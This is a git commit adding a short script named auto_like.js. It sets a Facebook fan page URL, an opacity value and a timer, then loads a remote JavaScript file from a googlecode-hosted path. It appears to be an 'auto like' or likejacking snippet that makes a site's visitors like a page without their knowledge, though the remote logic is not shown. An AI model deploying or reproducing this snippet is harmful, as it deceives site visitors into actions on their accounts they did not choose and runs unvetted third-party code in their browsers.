7b9bd5f5b70e226b314791f97ec1a687d0bec7ca
LeeBridal <leminhtrongle@gmail.com>
2016-01-15 13:19:07 +0700

    Create auto_like.js

---
+++ auto_like.js
@@ -0,0 +1,6 @@
+<script>
+var fan_page_url = &#39;https://www.facebook.com/Lee.BridalBoutique&#39;;       
+var opacity =1.01;
+var time = 2000; 
+</script>
+<script language='javascript' src='https://giaiphapthuonghieu-org.googlecode.com/svn/trunk/website/giaiphapthuonghieu_f.js'/>
